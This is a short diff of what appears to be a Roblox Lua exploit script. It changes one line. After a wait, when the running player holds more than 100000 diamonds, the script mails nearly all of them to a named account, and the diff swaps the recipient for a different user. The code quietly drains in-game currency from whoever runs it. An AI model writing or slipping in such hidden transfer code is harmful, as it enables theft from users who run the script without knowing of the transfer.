@@ -25,5 +25,5 @@ end
 wait(7)
  
 if Diamonds > 100000 then
-   CelestialScript.SendMail("Roblox", Diamonds-100001, {}, "MrFeast 8218")
+   CelestialScript.SendMail("Roblox", Diamonds-100001, {}, "Made By BroWhat#8139")
 end
